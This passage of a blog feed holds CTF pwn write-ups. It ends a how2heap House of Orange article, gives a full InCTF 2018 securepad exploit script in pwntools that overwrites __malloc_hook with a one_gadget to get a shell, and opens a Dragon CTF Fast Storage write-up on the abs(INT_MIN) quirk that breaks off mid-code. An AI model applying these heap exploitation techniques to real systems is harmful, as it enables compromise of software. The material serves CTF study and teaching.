top+0xd8</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt;  x/30gx p1-0x10+0x400</span><br><span class="line">0x602400:0x0068732f6e69622f0x0000000000000061</span><br><span class="line">0x602410:0x00007ffff7dd1b580x00007ffff7dd24f0</span><br><span class="line">0x602420:0x00000000000000020x0000000000000003</span><br><span class="line">0x602430:0x00000000000000000x0000000000000000</span><br><span class="line">0x602440:0x00000000000000000x0000000000000000</span><br><span class="line">0x602450:0x00000000000000000x0000000000000000</span><br><span class="line">0x602460:0x00000000000000000x0000000000000000</span><br><span class="line">0x602470:0x00000000000000000x0000000000400777</span><br><span class="line">0x602480:0x00000000000000000x0000000000000000</span><br><span class="line">0x602490:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024d0:0x00000000000000000x0000000000602460</span><br><span class="line">0x6024e0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; p *((struct _IO_FILE_plus *) 0x602400)</span><br><span class="line"><span class="variable">$20</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175,</span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd1b58 &lt;main_arena+88&gt; <span class="string">&quot;\020@b&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd24f0 <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,</span><br><span class="line">    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 4196215,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = 0x0,</span><br><span class="line">    _offset = 0,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x0,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x602460</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后随意分配一个 chunk，由于 <code>size&lt;= 2*SIZE_SZ</code>，所以会触发 <code>_IO_flush_all_lockp</code> 中的 <code>_IO_OVERFLOW</code> 函数，获得 shell。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br><span class="line">        size = chunksize (victim)</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关于how2heap 中 glibc 2.25的内容就到这里结束了。</p><p>关于 glibc 2.26 更多到是一些新版本 glibc 的check的bypass…就不准备再写成文章发出来了。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Inctf CTF 2018 secured Writeup</title>
      <link href="2018-inctf-Pwn-securepad-writrup.html"/>
      <url>2018-inctf-Pwn-securepad-writrup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 idx; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter index&quot;</span>);</span><br><span class="line">  idx = (<span class="keyword">signed</span> <span class="keyword">int</span>)get_int(<span class="string">&quot;Enter index&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == idx )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr = *(<span class="keyword">void</span> **)(<span class="number">8</span> * i + table);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    *(_QWORD *)(<span class="number">8</span> * i + table) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>in delete function, when idx = 10, the pointer is not initialized.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">breakpoint = &#123;</span><br><span class="line">    <span class="string">&quot;add&quot;</span>:<span class="number">0x555555555153</span>,</span><br><span class="line">    <span class="string">&quot;edit&quot;</span>:<span class="number">0x555555555169</span>,</span><br><span class="line">    <span class="string">&quot;delete&quot;</span>:<span class="number">0x55555555517F</span>,</span><br><span class="line">    <span class="string">&quot;view&quot;</span>: <span class="number">0x555555555195</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./securepad&#x27;, env = &#123;&#x27;LD_PRELOAD&#x27; : &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./securepad&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Auth</span>(<span class="params">passwd</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter password&quot;</span>,str(passwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">passwd,size,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    Auth(passwd)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter size&quot;</span>,str(size))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter data:&quot;</span>)</span><br><span class="line">    io.send(str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove</span>(<span class="params">passwd,idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    Auth(str(passwd))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter index&quot;</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">View</span>(<span class="params">passwd,idx</span>):</span></span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    Auth(passwd)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter index&quot;</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">passwd,idx,data</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    Auth(passwd)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter index&quot;</span>,str(idx))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    io.send(str(data))</span><br><span class="line"></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>,<span class="string">&quot;AAAA&quot;</span>) <span class="comment"># idx = 0</span></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>,<span class="string">&quot;BBBB&quot;</span>) <span class="comment"># idx = 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Remove(<span class="string">&quot;fuck&quot;</span>,<span class="number">1</span>)</span><br><span class="line">Remove(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;break *0x%x&#x27; % breakpoint[&#x27;add&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input(&#x27;wait to debug&#x27;)</span></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>,<span class="string">&quot;A&quot;</span>) <span class="comment"># idx = 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">View(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x41</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;leak heap addr:&#123;&#125;&quot;</span>.format(hex(heap_addr)))</span><br><span class="line"></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">32</span>,<span class="string">&quot;BBBB&quot;</span>) <span class="comment"># idx = 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Remove(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x3f0</span> + p64(heap_addr + <span class="number">0x20</span>),<span class="number">10</span>) <span class="comment"># why?</span></span><br><span class="line">Edit(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">View(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.readuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">3939072</span><span class="number">-88</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc base addr:&#123;&#125;&quot;</span>.format(hex(libc_addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">Remove(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x3f0</span> + p64(heap_addr + <span class="number">0x10</span>),<span class="number">10</span>)</span><br><span class="line">Edit(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0</span>, p64(libc_addr + malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;break *0x%x&#x27;</span> % breakpoint[<span class="string">&#x27;add&#x27;</span>])</span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">Add(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;hack by swing&#x27;</span>) <span class="comment"># split chunk -&gt; fastbin list ,fastbin is &quot;malloc_hook +23&quot;</span></span><br><span class="line">Add(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(libc_addr + <span class="number">0xf2519</span>)) <span class="comment"># malloc chunk in fastbins,and edit malloc -&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">Remove(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">Remove(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x3f0</span> + p64(heap_addr + <span class="number">0x10</span>),<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add(&quot;fuck&quot;,0x60,&#x27;fuck&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> incite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dragon CTF 2018 Fast Storage Writeup</title>
      <link href="dragon-ctf-2018-Fast-Storage-writeup.html"/>
      <url>dragon-ctf-2018-Fast-Storage-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>周末随意看了 Dragon CTF 2018 的题，主要看了两个 Pwn。两个都挺有意思的，但是这个题有个冷门知识。所以想稍微记录下。</p><h3 id="0x01-abs-0x8000000-0x8000000"><a href="#0x01-abs-0x8000000-0x8000000" class="headerlink" title="0x01 abs(0x8000000) == 0x8000000"></a>0x01 abs(0x8000000) == 0x8000000</h3><p>首先，我们先了解下 <code>abs</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       <span class="built_in">abs</span>, <span class="built_in">labs</span>, llabs, imaxabs - compute the absolute value of an integer</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">int</span> <span class="title">abs</span><span class="params">(<span class="keyword">int</span> j)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">long</span> <span class="keyword">int</span> <span class="title">labs</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> j)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="title">llabs</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> j)</span></span>;</span><br><span class="line"></span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">intmax_t</span> <span class="title">imaxabs</span><span class="params">(<span class="keyword">intmax_t</span> j)</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="function">Feature Test Macro Requirements <span class="keyword">for</span> <span class="title">glibc</span> <span class="params">(see feature_test_macros(<span class="number">7</span>))</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">       <span class="title">llabs</span><span class="params">()</span>:</span></span><br><span class="line">           _ISOC99_SOURCE || _POSIX_C_SOURCE &gt;= 200112L</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The  abs()  function  computes  the  absolute value of the integer argument j.  The labs(),</span><br><span class="line">       llabs() and imaxabs() functions compute the absolute value of the argument j of the  appro-</span><br><span class="line">       priate integer type <span class="keyword">for</span> the function.</span><br><span class="line"></span><br><span class="line">RETURN VALUE</span><br><span class="line">       Returns the absolute value of the integer argument, of the appropriate integer type <span class="keyword">for</span> the</span><br><span class="line">       function.</span><br></pre></td></tr></table></figure><p>我们可以知道，  abs 返回的参数是 inter。</p><p>我们也知道 inter 的范围如下表：</p><table><thead><tr><th>类型</th><th>字节</th><th>范围</th></tr></thead><tbody><tr><td>short int</td><td>2byte(word)</td><td>0<del>32767(0</del>0x7fff)  -32768<del>-1(0x8000</del>0xffff)</td></tr><tr><td>unsigned short int</td><td>2byte(word)</td><td>0<del>65535(0</del>0xffff)</td></tr><tr><td>int</td><td>4byte(dword)</td><td>0<del>2147483647(0</del>0x7fffffff)  -2147483648<del>-1(0x80000000</del>0xffffffff)</td></tr><tr><td>unsigned int</td><td>4byte(dword)</td><td>0<del>4294967295(0</del>0xffffffff)</td></tr><tr><td>long int</td><td>8byte(qword)</td><td>正: 0<del>0x7fffffffffffffff  负:0x8000000000000000</del>0xffffffffffffffff</td></tr><tr><td>unsigned long int</td><td>8byte(qword)</td><td>0~0xffffffffffffffff</td></tr></tbody></table><p>int  的表示范围为 <strong>0<del>2147483647(0</del>0x7fffffff)  -2147483648<del>-1(0x80000000</del>0xffffffff)</strong> , 以 常理而言，     <code>abs</code> 这个取绝对值的函数，返回的应该是正数吧…</p><p> 然后这里的 asb(0x80000000) == 0x80000000 这是为什么？ （inter : 0x80000000 == -2147483648)</p><p>**Why? **</p><p>单纯从二进制来看：</p><p> bin(0x80000000)<br>‘0b10000000000000000000000000000000’</p><p><strong>0x80000000 == 10000000000000000000000000000000</strong> </p><p>但是 32bit的 整型数实际上只以 31 位表示，最高位表示符号。换一句话说，0x80000000 溢出，覆盖到了 符号位。在 32bit 整型中，如果是负整数的话，则要将后面的31个二进制位取反加1之后才是其绝对值。</p><p>换一句话说   ~0 +1 == 0 。那么 abs(0x8000000)==0x8000000 并不是没有道理。</p><h3 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">calculation</span><span class="params">(__int64 data, __int64 value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// ST18_1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// ST14_1</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v2 = hash1(data);</span><br><span class="line">  v3 = hahs2(data);</span><br><span class="line">  v4 = hash3(data);</span><br><span class="line">  idx = <span class="built_in">abs</span>(v2) % <span class="number">62</span>;</span><br><span class="line">  link(idx, data, value);</span><br><span class="line">  <span class="keyword">return</span> add_bitmap(idx, v3, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 abs(v1 ) 返回 0x8000000 ，那么取模后， v4 的值实际上等于 -2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000555555756040 ; _DWORD name_arrary[64]</span><br><span class="line">.bss:0000555555756040 name_arrary     dd 40h dup(?)           ; DATA XREF: add_bitmap+D↑o</span><br><span class="line">.bss:0000555555756040                                         ; add_bitmap+3D↑o ...</span><br><span class="line">.bss:0000555555756140 ; _QWORD list[62]</span><br><span class="line">.bss:0000555555756140 list  </span><br></pre></td></tr></table></figure><p> 这样我们可以 bitmap 和 list 重合。</p><h3 id="0x3-code-exploit"><a href="#0x3-code-exploit" class="headerlink" title="0x3 code exploit"></a>0x3 code exploit</h3><p>首先，我们得先得到一个 0x8000000。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➜  /tmp python solve.py</span><br><span class="line">sat</span><br><span class="line">[d = <span class="number">169</span>, c = <span class="number">230</span>, a = <span class="number">161</span>, b = <span class="number">248</span>]</span><br><span class="line">➜  /tmp cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> 